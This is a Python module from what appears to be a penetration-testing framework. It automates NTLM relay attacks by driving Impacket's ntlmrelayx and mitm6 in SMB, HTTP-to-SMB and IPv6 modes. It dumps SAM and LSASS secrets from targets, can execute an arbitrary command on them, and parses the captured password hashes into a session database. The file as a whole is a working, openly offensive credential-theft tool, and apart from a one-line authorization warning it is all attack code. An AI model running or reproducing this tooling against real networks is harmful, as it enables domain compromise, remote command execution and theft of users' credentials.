#!/usr/bin/env python3
"""
NTLM Relay Attack Framework
Relays captured NTLM authentication to target servers for exploitation

WARNING: Active attack. Use only with explicit authorization.
"""

import sys
import os
import argparse
import subprocess
import time
import json
from datetime import datetime

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.database import DatabaseManager
from core.logger import setup_logger, get_logger

logger = None

class NTLMRelayAttack:
    """NTLM relay attack using Impacket's ntlmrelayx"""
    
    def __init__(self, targets, session_dir):
        self.targets = targets if isinstance(targets, list) else [targets]
        self.session_dir = session_dir
        self.ntlmrelayx_path = self._find_ntlmrelayx()
        self.relay_results = []
    
    def _find_ntlmrelayx(self):
        """Locate ntlmrelayx.py from Impacket"""
        possible_paths = [
            '/usr/local/bin/ntlmrelayx.py',
            '/usr/bin/ntlmrelayx.py',
            'ntlmrelayx.py',
            './impacket/examples/ntlmrelayx.py'
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                logger.info(f"Found ntlmrelayx at: {path}")
                return path
        
        # Try which command
        try:
            result = subprocess.run(['which', 'ntlmrelayx.py'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                path = result.stdout.strip()
                logger.info(f"Found ntlmrelayx at: {path}")
                return path
        except:
            pass
        
        logger.warning("ntlmrelayx not found. Install Impacket:")
        logger.warning("  pip3 install impacket")
        return None
    
    def run_smb_relay(self, command=None, dump_sam=False, dump_lsass=False):
        """
        Execute SMB NTLM relay attack
        
        Args:
            command: Command to execute on target
            dump_sam: Dump SAM database
            dump_lsass: Dump LSASS secrets
        """
        if not self.ntlmrelayx_path:
            logger.error("ntlmrelayx not available")
            return False
        
        logger.info("=" * 60)
        logger.info("NTLM Relay Attack - SMB")
        logger.info("=" * 60)
        logger.info(f"Targets: {', '.join(self.targets)}")
        
        # Create target file
        target_file = os.path.join(self.session_dir, 'ntlm_relay_targets.txt')
        with open(target_file, 'w') as f:
            for target in self.targets:
                f.write(f"{target}\n")
        
        logger.info(f"Target file: {target_file}")
        
        # Build ntlmrelayx command
        cmd = [
            'python3', self.ntlmrelayx_path,
            '-tf', target_file,  # Target file
            '-smb2support',      # SMBv2 support
        ]
        
        # Add attack options
        if dump_sam:
            cmd.append('--dump-sam')
            logger.info("Mode: SAM dump")
        
        if dump_lsass:
            cmd.append('--dump-lsass')
            logger.info("Mode: LSASS dump")
        
        if command:
            cmd.extend(['-c', command])
            logger.info(f"Command: {command}")
        else:
            # Default: dump SAM
            cmd.append('--dump-sam')
            logger.info("Mode: SAM dump (default)")
        
        # Output directory
        output_dir = os.path.join(self.session_dir, 'ntlm_relay_output')
        os.makedirs(output_dir, exist_ok=True)
        cmd.extend(['-outputfile', os.path.join(output_dir, 'relay')])
        
        logger.info(f"Command: {' '.join(cmd)}")
        logger.warning("⚠️  NTLM relay attack starting...")
        logger.warning("⚠️  Waiting for incoming NTLM authentications...")
        
        try:
            # Run ntlmrelayx
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            # Monitor output
            while True:
                line = process.stdout.readline()
                if not line:
                    break
                
                line = line.strip()
                logger.info(f"[ntlmrelayx] {line}")
                
                # Parse successful relay
                if 'Authenticating against' in line:
                    logger.warning(f"🎯 {line}")
                
                if 'Dumping SAM' in line or 'Dumping LSA' in line:
                    logger.warning(f"💾 {line}")
                
                if 'dumped' in line.lower() and 'hash' in line.lower():
                    self._parse_relay_result(line)
            
            process.wait()
            logger.info(f"NTLM relay completed. Got {len(self.relay_results)} results")
            return True
            
        except KeyboardInterrupt:
            logger.warning("Relay attack interrupted by user")
            process.terminate()
            return False
        
        except Exception as e:
            logger.error(f"NTLM relay failed: {e}")
            return False
    
    def run_http_relay(self):
        """Execute HTTP to SMB NTLM relay"""
        if not self.ntlmrelayx_path:
            logger.error("ntlmrelayx not available")
            return False
        
        logger.info("=" * 60)
        logger.info("NTLM Relay Attack - HTTP to SMB")
        logger.info("=" * 60)
        
        target_file = os.path.join(self.session_dir, 'ntlm_relay_targets.txt')
        with open(target_file, 'w') as f:
            for target in self.targets:
                f.write(f"{target}\n")
        
        cmd = [
            'python3', self.ntlmrelayx_path,
            '-tf', target_file,
            '-smb2support',
            '-t', 'smb://' + self.targets[0],  # Primary target
            '--dump-sam'
        ]
        
        logger.info(f"Command: {' '.join(cmd)}")
        logger.warning("⚠️  HTTP relay listening on port 80...")
        logger.warning("⚠️  Trigger with: Start-Process 'http://<attacker-ip>/'")
        
        try:
            subprocess.run(cmd, timeout=300)  # 5 minute timeout
            return True
        except subprocess.TimeoutExpired:
            logger.info("HTTP relay timed out")
            return False
        except Exception as e:
            logger.error(f"HTTP relay failed: {e}")
            return False
    
    def run_ipv6_relay(self, ipv6_dns):
        """
        Execute IPv6 NTLM relay with mitm6
        
        Args:
            ipv6_dns: IPv6 DNS server to advertise
        """
        # Check for mitm6
        try:
            subprocess.run(['which', 'mitm6'], check=True, 
                         capture_output=True)
        except:
            logger.error("mitm6 not found. Install with:")
            logger.error("  pip3 install mitm6")
            return False
        
        logger.info("=" * 60)
        logger.info("NTLM Relay Attack - IPv6 (mitm6)")
        logger.info("=" * 60)
        
        # Run mitm6 in background
        mitm6_cmd = [
            'mitm6',
            '-d', ipv6_dns,  # Domain
            '-i', 'eth0'      # Interface
        ]
        
        logger.info(f"Starting mitm6: {' '.join(mitm6_cmd)}")
        
        try:
            # Start mitm6
            mitm6_proc = subprocess.Popen(
                mitm6_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )
            
            time.sleep(5)  # Let mitm6 start
            
            # Start ntlmrelayx
            logger.info("Starting ntlmrelayx for IPv6 relay...")
            success = self.run_smb_relay(dump_sam=True)
            
            # Stop mitm6
            mitm6_proc.terminate()
            mitm6_proc.wait()
            
            return success
            
        except Exception as e:
            logger.error(f"IPv6 relay failed: {e}")
            return False
    
    def _parse_relay_result(self, line):
        """Parse successful relay from output"""
        self.relay_results.append({
            'timestamp': datetime.now().isoformat(),
            'result': line
        })
    
    def parse_relay_output(self):
        """Parse ntlmrelayx output files for credentials"""
        output_dir = os.path.join(self.session_dir, 'ntlm_relay_output')
        
        if not os.path.exists(output_dir):
            return []
        
        credentials = []
        
        # Look for SAM dump files
        for filename in os.listdir(output_dir):
            if filename.endswith('.sam'):
                filepath = os.path.join(output_dir, filename)
                logger.info(f"Parsing SAM dump: {filename}")
                
                with open(filepath, 'r') as f:
                    for line in f:
                        if ':' in line:
                            parts = line.strip().split(':')
                            if len(parts) >= 4:
                                credentials.append({
                                    'username': parts[0],
                                    'hash': line.strip(),
                                    'source': f'NTLM-Relay:{filename}',
                                    'type': 'NTLM'
                                })
        
        logger.info(f"Extracted {len(credentials)} credentials from relay")
        return credentials


def main(session_dir, targets, mode='smb', domain=None, command=None):
    """Main NTLM relay execution"""
    global logger
    
    setup_logger("ntlm_relay", session_dir)
    logger = get_logger("ntlm_relay")
    
    # Check for root
    if os.geteuid() != 0:
        logger.error("NTLM relay requires root privileges")
        return
    
    logger.info("=" * 60)
    logger.info("NTLM Relay Attack Framework")
    logger.info("=" * 60)
    
    # Initialize database
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    # Initialize relay attack
    relay = NTLMRelayAttack(targets, session_dir)
    
    # Execute based on mode
    if mode == 'smb':
        success = relay.run_smb_relay(command=command, dump_sam=True)
    elif mode == 'http':
        success = relay.run_http_relay()
    elif mode == 'ipv6':
        if not domain:
            logger.error("IPv6 relay requires --domain")
            return
        success = relay.run_ipv6_relay(domain)
    else:
        logger.error(f"Unknown mode: {mode}")
        return
    
    if not success:
        logger.error("NTLM relay failed")
        return
    
    # Parse output
    credentials = relay.parse_relay_output()
    
    # Save to database
    for cred in credentials:
        db.add_credential(
            username=cred['username'],
            domain='N/A',
            password=cred['hash'],
            source=cred['source'],
            is_hash=True
        )
    
    logger.info(f"✅ NTLM relay complete. Captured {len(credentials)} hashes")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="NTLM Relay Attack Framework"
    )
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--targets", required=True, help="Comma-separated target IPs")
    parser.add_argument("--mode", choices=['smb', 'http', 'ipv6'], default='smb')
    parser.add_argument("--domain", help="Domain (for IPv6 mode)")
    parser.add_argument("--command", help="Command to execute")
    
    args = parser.parse_args()
    
    targets = args.targets.split(',')
    main(args.session_dir, targets, args.mode, args.domain, args.command)
